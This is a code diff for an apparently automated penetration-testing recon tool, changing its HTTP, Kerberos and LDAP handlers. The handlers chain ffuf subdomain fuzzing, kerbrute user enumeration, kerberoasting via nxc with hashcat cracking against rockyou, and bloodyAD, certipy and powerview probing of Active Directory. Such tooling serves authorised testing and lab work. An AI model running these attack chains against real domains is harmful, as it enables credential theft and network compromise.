@@ -91,12 +91,9 @@ def dns_tasks(context):
 
 @port_registry.register_port_handler(80)
 def http_tasks(context):
-    if context.vhost or context.domain:
-        if context.vhost == context.domain:
-            target = context.domain
-            run_task(context, f"firefox 'http://{target}' &; disown; ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{target} -H 'Host: FUZZ.{target}' -ac; ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://{target}/FUZZ")
-        else:
-            target = context.vhost
+    write_log(context.log_file, f"vhost: {context.vhost}, domain: {context.domain}, ip: {context.ip}")
+    target = context.vhost or context.domain
+    if target:
         run_task(context, f"firefox 'http://{target}' &; disown; ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{target} -H 'Host: FUZZ.{target}' -ac; ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://{target}/FUZZ")
     else:
         target = context.ip
@@ -108,7 +105,7 @@ def kerberos_tasks(context):
     if context.creds_exist():
         user, passwd = context.get_initial_cred()
         run_task(context, f"sudo ntpdate {context.ip}; getTGT.py {context.domain}/{user}:'{passwd}'")
-    run_task(context, f"sudo ntpdate {context.ip}; kerbrute userenum -d {context.domain} --dc {context.ip} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt")
+    run_task(context, f"sudo ntpdate {context.ip}; kerbrute userenum -d {context.domain} --dc {context.ip} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --downgrade")
 
 @port_registry.register_port_handler(389)
 def ldap_tasks(context):
@@ -119,11 +116,13 @@ def ldap_tasks(context):
         run_task(context, f"bloodyAD --host {context.hostname}.{context.domain} -d {context.domain} -u {user} -p '{passwd}' get writable; certipy find -u {user}@{context.domain} -p '{passwd}' -dc-ip {context.ip} -stdout")
     else:
         # Check anonymous bind
-        ldap_conn = ldap.LDAPConnection(f"ldap://{context.domain}", f"{context.ip}")
+        conn = ldap.LDAPConnection(f"ldap://{context.domain}", f"{context.ip}")
         try:
-            ldap_conn.login("","")
+            conn.login("","")
             write_log(context.log_file, f"LDAP anonymous bind is enabled", "SUCCESS")
-            run_task(context, f"nxc ldap {context.ip} -u '' -p '' --users --find-delegation --trusted-for-delegation --kerberoasting hashes.kerberoast; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
+            target = context.get_target()
+            run_task(context, f"nxc ldap {target} -u '' -p '' --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
+            run_task(context, f"powerview {target}")
         except Exception as e:
             return
 
